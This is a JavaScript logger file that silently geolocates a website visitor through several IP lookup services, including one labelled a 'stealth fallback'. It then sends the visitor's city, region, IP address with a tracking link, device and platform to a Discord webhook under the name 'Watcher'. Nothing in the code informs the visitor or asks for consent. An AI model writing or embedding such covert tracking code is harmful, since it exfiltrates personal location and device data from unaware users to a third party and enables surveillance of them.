// js/logger.js

// 1. Move the helper to the top (Outer scope)
async function fetchWithTimeout(resource, options = {}) {
    const { timeout = 2000 } = options;
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    
    try {
        const response = await fetch(resource, { ...options, signal: controller.signal });
        clearTimeout(id);
        return response;
    } catch (err) {
        clearTimeout(id);
        throw err;
    }
}

window.sendPrivateLog = async function(message, isEmergency = false) {
    if (!window._secret) return;

    const mode = window.getLoggingMode();
    const url = window.getLogKey();
    const isPriority = (isEmergency === true || isEmergency === 1);

    if (mode === "off" || (mode === "emergency" && !isPriority)) return;

    try {
        const device = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
        const platform = navigator.platform;
        let locationData = "Location Hidden";

        // --- STEP 1: Try ipapi.co (Original) ---
        try {
            const res1 = await fetchWithTimeout("https://ipapi.co/json/");
            if (res1.ok) {
                const geo = await res1.json();
                locationData = `${geo.city}, ${geo.region} (${geo.country_name})`;
            } else throw new Error();
        } catch (e1) {
            // --- STEP 2: Try ipwho.is (Secondary City Lookup) ---
            try {
                const res2 = await fetchWithTimeout("https://ipwho.is/");
                const geo2 = await res2.json();
                if (geo2.success) {
                    locationData = `${geo2.city}, ${geo2.region} (${geo2.country})`;
                } else throw new Error();
            } catch (e2) {
                // --- STEP 3: Final Stealth Fallback (Cloudflare Link) ---
                try {
                    const res3 = await fetch("https://1.1.1.1/cdn-cgi/trace");
                    const text = await res3.text();
                    const data = Object.fromEntries(text.trim().split('\n').map(e => e.split('=')));
                    const ip = data.ip || "0.0.0.0";
                    const loc = data.loc || "??";
                    locationData = `${loc} | [Track IP: ${ip}](https://whatismyipaddress.com/ip/${ip})`;
                } catch (e3) {
                    locationData = "All Geo-Services Blocked";
                }
            }
        }

        // 3. Send to Discord
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: isPriority ? "🚨 PRIORITY" : "Watcher",
                content: `**Event**: ${message}\n🌍 **Loc**: ${locationData}\n📱 **Dev**: ${device} (${platform})`
            })
        });
        
    } catch (e) {
        console.error("❌ Logger Failed:", e);
    }
};